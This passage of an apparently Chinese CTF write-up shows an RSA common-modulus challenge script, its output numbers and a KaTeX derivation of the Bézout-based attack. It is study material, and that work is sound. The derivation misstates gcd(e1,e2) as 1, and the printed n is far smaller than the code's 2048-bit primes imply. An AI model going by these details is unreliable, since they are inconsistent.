class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;&#x27;</span> + <span class="built_in">str</span>(uuid.uuid4()).encode()+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e1 = random.randint(<span class="number">2</span>**<span class="number">9</span>,<span class="number">2</span>**<span class="number">10</span>)</span><br><span class="line">e2 = random.randint(<span class="number">2</span>**<span class="number">9</span>,<span class="number">2</span>**<span class="number">10</span>)</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>,c2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gcd(e1,e2) =&quot;</span>,gmpy2.gcd(e1,e2))</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e1 = 776</span></span><br><span class="line"><span class="string">e2 = 660</span></span><br><span class="line"><span class="string">n = 83685592643015631285511109663325122006760075584070237854675562002076227876018375942188686437412417554344776894370097201033426874441336708646624883445380146070344328421967347863076320208287674554891010711418786407828605518837809737258170089927317008100377276660831635304144479856615378434494150317241691405699</span></span><br><span class="line"><span class="string">c1 = 36299289915782897291165052853638301870957152722428510897342204593316850303542079849676568285857303159762709605563489283030869099273611779877254853356688986853696443779220783593658624342473581938754872289713670062547043089816659273356194704277435964456461072332286114555658456270426215294643175591217906091755</span></span><br><span class="line"><span class="string">c2 = 49943255108816727418959338909424707941215549374121313411779599086453527489023566862613934533928451896342569719440495017955832687024686166587752169810336138451439400664572517556546110360539667183745627145127591816783932939746214213153708059533454010448797476344617536862513447513045215949581066286489331011975</span></span><br><span class="line"><span class="string">gcd(e1,e2) = 4</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><details>    <summary>推导过程</summary><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>已知</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>1</mn></msub></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mn>2</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>n</mi></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}已知: \\c_1=m^{e_1}~~mod~(n)\\c_2=m^{e_2}~~mod~(n)\\gcd(e_1,e_2)=x\\e1,e2\\n\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.200000000000001em;vertical-align:-3.35em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.850000000000001em;"><span style="top:-6.010000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">知</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span></span><span style="top:-4.810000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-3.6100000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span></span></span><span style="top:-1.2100000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mord">2</span></span></span><span style="top:-0.009999999999999953em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>因为存在</mtext><mo stretchy="false">(</mo><msub><mi>e</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>e</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以由裴蜀定理得存在</mtext><mi>s</mi><mo separator="true">,</mo><mi>t</mi><mo>∈</mo><mi>Z</mi><mtext>有</mtext><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi><mo>+</mo><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi><mo>=</mo><mi>x</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>所以</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>1</mn></msub></msup><msup><mo stretchy="false">)</mo><mi>s</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><mo stretchy="false">(</mo><msup><mi>m</mi><msub><mi>e</mi><mn>2</mn></msub></msup><msup><mo stretchy="false">)</mo><mi>t</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>所以</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi></mrow></msup><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>可以得到</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><msup><mi>m</mi><mrow><msub><mi>e</mi><mn>1</mn></msub><mi>s</mi><mo>+</mo><msub><mi>e</mi><mn>2</mn></msub><mi>t</mi></mrow></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>最后得到</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msubsup><mi>c</mi><mn>1</mn><mi>s</mi></msubsup><msubsup><mi>c</mi><mn>2</mn><mi>t</mi></msubsup><mo>=</mo><msup><mi>m</mi><mi>x</mi></msup><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这时再由于</mtext><mi>x</mi><mtext>比较小，所以</mtext><msup><mi>m</mi><mi>x</mi></msup><mtext>肯定会比</mtext><mi>n</mi><mtext>小，也就简化问题为低指数加密直接开方就行</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}因为存在(e_1,e_2)=1\\所以由裴蜀定理得存在s,t∈Z有e_1s+e_2t=x\\所以\\c_1^{s}=(m^{e_1})^{s}~~mod~(n)=m^{e_1s}~~mod~(n)\\c_2^{t}=(m^{e_2})^{t}~~mod~(n)=m^{e_2t}~~mod~(n)\\所以\\c_1^{s}c_2^{t} = m^{e_1s}m^{e_2t}~~mod(n)\\可以得到\\c_1^{s}c_2^{t} = m^{e_1s+e_2t}~~mod(n)\\最后得到\\c_1^{s}c_2^{t} = m^{x}~~mod(n)\\这时再由于x比较小，所以m^x肯定会比n小，也就简化问题为低指数加密直接开方就行\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:14.399999999999999em;vertical-align:-6.949999999999999em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:7.449999999999998em;"><span style="top:-9.609999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span><span style="top:-8.409999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">裴</span><span class="mord cjk_fallback">蜀</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord cjk_fallback">有</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span></span></span><span style="top:-7.209999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span></span></span><span style="top:-6.009999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">s</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-4.809999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-3.609999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span></span></span><span style="top:-2.409999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7935559999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mathnormal 